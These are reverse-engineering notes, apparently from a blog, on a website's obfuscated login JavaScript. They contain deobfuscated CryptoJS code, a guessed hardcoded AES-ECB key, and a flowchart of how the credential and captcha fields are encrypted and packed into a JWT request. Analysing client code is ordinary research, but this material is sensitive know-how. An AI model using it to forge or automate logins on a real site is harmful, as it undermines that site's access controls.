_0x59156a=_0x4556a7[&#x27;enc&#x27;][&#x27;Utf8&#x27;][&#x27;parse&#x27;](_0x4f1109);_0x1f437c=0x2;var _0x37244f=_0x5e06d2[&quot;\\u0041\\u0045\\u0053&quot;][&#x27;encrypt&#x27;](_0x59156a,_0x3d5956,&#123;&quot;\\u006d\\u006f\\u0064\\u0065&quot;:_0x45b1d0(),&quot;\\u0070\\u0061\\u0064\\u0064\\u0069\\u006e\\u0067&quot;:_0x1c4aa3[&quot;\\u0070\\u0061\\u0064&quot;][&quot;\\u0050\\u006b\\u0063\\u0073\\u0037&quot;]&#125;);return _0x37244f[&#x27;toString&#x27;]();&#125;else&#123;this[&#x27;_cipher&#x27;][&#x27;decryptBlock&#x27;](_0x4e4888,_0x164758);&#125;&#125;&#125;);function _0x248003(_0x1527d3,_0x5dcae2,_0x25f174,_0x213d3a,_0x33d22c)&#123;return _0x443f(_0x213d3a- -0x2ae,_0x33d22c);&#125;return _0xd82ce2;&#125;\n明显的混淆，反一下。https://obf-io.deobfuscate.io/\nvar CryptoJS = document.write(&quot;&gt;tpircs/&lt;&gt;&#x27;sj.sea/bil/sj/..&#x27;=crs tpircsavaj=egaugnal tpircs&lt;&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;));var base64 = document.write(&quot;&gt;tpircs/&lt;&gt;&#x27;sj.46esab/bil/sj/..&#x27;=crs tpircsavaj=egaugnal tpircs&lt;&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;));(function (_0x2aea55, _0x2e748c) &#123;  var _0x2ad42e = _0x2aea55();  while (true) &#123;    try &#123;      var _0x122ced = parseInt(_0x443f(5, -0x267)) / 0x1 * (parseInt(_0x443f(27, -0x249)) / 0x2) + -parseInt(_0x443f(22, 0x17f)) / 0x3 * (-parseInt(_0x443f(16, -0x267)) / 0x4) + -parseInt(_0x443f(33, -0x178)) / 0x5 * (parseInt(_0x443f(28, 0x3db)) / 0x6) + parseInt(_0x443f(4, -0x26a)) / 0x7 + parseInt(_0x443f(23, -0x260)) / 0x8 + parseInt(_0x443f(0, -0x178)) / 0x9 * (parseInt(_0x443f(1, 0x161)) / 0xa) + -parseInt(_0x443f(12, -0x264)) / 0xb;      if (_0x122ced === _0x2e748c) &#123;        break;      &#125; else &#123;        _0x2ad42e.push(_0x2ad42e.shift());      &#125;    &#125; catch (_0x40a231) &#123;      _0x2ad42e.push(_0x2ad42e.shift());    &#125;  &#125;&#125;)(_0x5154, 0x37ac5);var _0x5f = 15;function _0x4d1802(_0x5ec7f3, _0x5d6a04, _0x4eea62, _0x3948d7, _0x3e3f76) &#123;  return _0x443f(_0x3e3f76 + 0x1f5, _0x3948d7);&#125;var aeskeyOriginal = _0x443f(24, -0x1d6);function _0x443f(_0x3c35be, _0x5154ce) &#123;  var _0x443fce = _0x5154();  _0x443f = function (_0x56e89c, _0x384a2) &#123;    _0x56e89c = _0x56e89c - 0x0;    var _0x5089ac = _0x443fce[_0x56e89c];    return _0x5089ac;  &#125;;  return _0x443f(_0x3c35be, _0x5154ce);&#125;function _0x5154() &#123;  var _0x31fd54 = [&quot;enc&quot;, &quot;KINoJq9212251&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;), &quot;VwGnXp112&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;), &quot;parse&quot;, &quot;kcolBtpyrced&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;), &quot;gnirtsbus&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;), &quot;htgnel&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;), &#x27;Pkcs7&#x27;, &quot;dap&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;), &quot;bfkGlR4990788&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;), &#x27;lib&#x27;, &quot;dnetxe&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;), &quot;Utf8&quot;, &quot;JZWyCW6922411&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;), &quot;Encryptor&quot;, &quot;AES&quot;, &quot;cdph&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;), &quot;Decryptor&quot;, &#x27;ehpe&#x27;, &quot;3sVABFb&quot;, &#x27;3260760oYubim&#x27;, &#x27;202306045YDZCWGZ&#x27;, &quot;rehpic_&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;), &#x27;FbKtv&#x27;, &quot;ClRYxq0501&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;), &#x27;4194meseVb&#x27;, &quot;gnirtSot&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;), &#x27;jrCCd&#x27;, &quot;encrypt&quot;, &quot;BlockCipherMode&quot;, &quot;TnZGlN55&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;), &quot;rorre&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;), &quot;9mCGKMT&quot;, &#x27;207890VhBBQE&#x27;, &quot;encryptBlock&quot;];  _0x5154 = function () &#123;    return _0x31fd54;  &#125;;  return _0x5154();&#125;_0x5f = 0x9;var aeskey = function (_0x3f2016) &#123;  var _0x435ae5 = _0x3f2016.length;  if (_0x435ae5 &gt; 16) &#123;    _0x3f2016 = _0x3f2016.substring(0, 16);  &#125;  if (_0x435ae5 &lt; 16) &#123;    if (_0x443f(30, 0x68) === _0x443f(30, 0x7b)) &#123;      var _0x4a8e78;      var _0xc0aad7 = 16 - _0x435ae5;      _0x4a8e78 = _0x443f(21, -0x177);      var _0x145175 = [&#x27;G&#x27;, &quot;Z&quot;, &#x27;Z&#x27;, &#x27;S&#x27;];      for (var _0x21fe72 = 0; _0x21fe72 &lt; _0xc0aad7; _0x21fe72++) &#123;        console.error(_0x145175[_0x21fe72 % 4]);        _0x3f2016 = _0x3f2016 + _0x145175[_0x21fe72 % 4];      &#125;    &#125; else &#123;      var _0x1ed31f;      var _0xa8c99e = 16 - _0xd66675;      _0x1ed31f = _0x443f(21, 0x2b4);      var _0x1aa99a = [&quot;G&quot;, &quot;Z&quot;, &#x27;Z&#x27;, &#x27;S&#x27;];      for (var _0x32f003 = 0; _0x32f003 &lt; _0xa8c99e; _0x32f003++) &#123;        _0x19b9fe.error(_0x1aa99a[_0x32f003 % 4]);        _0x50f28f = _0x3d143f + _0x1aa99a[_0x32f003 % 4];      &#125;    &#125;  &#125;  return _0x3f2016;&#125;(aeskeyOriginal);function Encrypt(_0xd38f18) &#123;  var _0x24f3da = CryptoJS.enc.Utf8.parse(aeskey);  var _0x496e2a = 5;  var _0x1d81ab = CryptoJS.enc.Utf8.parse(_0xd38f18);  _0x496e2a = 0x2;  var _0x4e1e84 = CryptoJS.AES.encrypt(_0x1d81ab, _0x24f3da, &#123;    &#x27;mode&#x27;: getEcb(),    &#x27;padding&#x27;: CryptoJS.pad.Pkcs7  &#125;);  return _0x4e1e84.toString();&#125;function getEcb() &#123;  var _0x359456;  var _0xd82ce2 = CryptoJS.lib.BlockCipherMode.extend();  _0x359456 = _0x443f(19, -0x28e);  _0xd82ce2.Encryptor = _0xd82ce2.extend(&#123;    &quot;processBlock&quot;: function (_0x1ee2c8, _0x5518cc) &#123;      this._cipher.encryptBlock(_0x1ee2c8, _0x5518cc);    &#125;  &#125;);  _0xd82ce2.Decryptor = _0xd82ce2.extend(&#123;    &#x27;processBlock&#x27;: function (_0x4e4888, _0x164758) &#123;      if (_0x443f(26, 0x20f) !== _0x443f(26, 0x3d)) &#123;        var _0x3d5956 = _0x318c97.enc.Utf8.parse(_0x434618);        var _0x1f437c = 5;        var _0x59156a = _0x4556a7.enc.Utf8.parse(_0x4f1109);        _0x1f437c = 0x2;        var _0x37244f = _0x5e06d2.AES.encrypt(_0x59156a, _0x3d5956, &#123;          &quot;mode&quot;: _0x45b1d0(),          &quot;padding&quot;: _0x1c4aa3.pad.Pkcs7        &#125;);        return _0x37244f.toString();      &#125; else &#123;        this._cipher.decryptBlock(_0x4e4888, _0x164758);      &#125;    &#125;  &#125;);  return _0xd82ce2;&#125;\n还是看不懂，让ai读下：很笨，但是推测AESkey为encryptBlockGZZS,加密方式为ECB（没有加密向量）目前AES还没解出来加密流程图参考：\nflowchart TD    A[JS程序生成UUID] --&gt; B[将UUID传给验证码接口]    B --&gt; C[验证码接口返回一次性验证码]    C --&gt; D[用户输入账号、密码、验证码]    D --&gt; E[JS程序接收账号、密码、验证码]    E --&gt; F1[&quot;对账号进行AES(ECB模式)加密&quot;]    E --&gt; F2[&quot;对密码进行AES(ECB模式)加密&quot;]    E --&gt; F3[&quot;对验证码进行AES(ECB模式)加密&quot;]    E --&gt; F4[&quot;对ecatid进行AES(ECB模式)加密&quot;]    E --&gt; F5[&quot;对accsms进行AES(ECB模式)加密&quot;]    F1 --&gt; G1[将加密后的账号进行Base64转码]    F2 --&gt; G2[将加密后的密码进行Base64转码]    F3 --&gt; G3[将加密后的验证码进行Base64转码]    F4 --&gt; G4[将加密后的ecatid进行Base64转码]    F5 --&gt; G5[将加密后的accsms进行Base64转码]    E --&gt; H[获取version字段]    E --&gt; I[获取type字段]    E --&gt; J[获取vtype字段]    E --&gt; K[获取uuid字段]    K --&gt; L[将UUID进行加密]    E --&gt; M1[获取Timestamp字段]    E --&gt; N1[获取catid字段]    N1 --&gt; O1[&quot;对catid进行AES(ECB模式)加密&quot;]    O1 --&gt; P1[将加密后的catid进行Base64转码]    G1 --&gt; Q[生成JWT的payload]    G2 --&gt; Q    G3 --&gt; Q    G4 --&gt; Q    G5 --&gt; Q    P1 --&gt; Q    H --&gt; Q    I --&gt; Q    J --&gt; Q    L --&gt; Q    M1 --&gt; Q    Q --&gt; R[&quot;对payload进行JWT编码(使用服务器密钥)&quot;]    R --&gt; S[去掉JWT编码后的header和签名]    S --&gt; T[将JWT编码后的信息进行URL转码]    T --&gt; U[将URL转码后的信息放入请求包body]    U --&gt; V[发送请求]    subgraph 加密和转码流程    F1 --&gt; G1    F2 --&gt; G2    F3 --&gt; G3    F4 --&gt; G4    F5 --&gt; G5    O1 --&gt; P1    end    subgraph 获取字段    E --&gt; H    E --&gt; I    E --&gt; J    E --&gt; K    E --&gt; M1    E --&gt; N1    N1 --&gt; O1    end\n"}]